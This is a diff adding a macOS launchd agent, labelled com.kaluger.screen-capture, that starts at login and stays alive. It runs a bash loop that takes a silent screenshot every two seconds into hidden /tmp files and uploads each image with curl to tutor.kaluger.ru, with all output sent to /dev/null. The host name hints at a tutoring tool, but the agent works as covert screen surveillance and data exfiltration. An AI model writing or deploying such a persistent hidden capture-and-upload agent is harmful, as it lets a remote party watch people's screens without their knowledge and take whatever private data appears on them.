@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.kaluger.screen-capture</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/bash</string>
+        <string>-c</string>
+        <string>while true; do screencapture -t jpg -x /tmp/.sc_raw.jpg &amp;&amp; sips -s formatOptions 30 /tmp/.sc_raw.jpg --out /tmp/.sc.jpg > /dev/null 2>&amp;1 &amp;&amp; curl -s -L --post301 -X POST -H "Content-Type: image/jpeg" -H "X-Screen-Token: ВСТАВЬ_ТОКЕН" --data-binary @/tmp/.sc.jpg https://tutor.kaluger.ru/api/screen/upload; sleep 2; done</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+</dict>
+</plist>
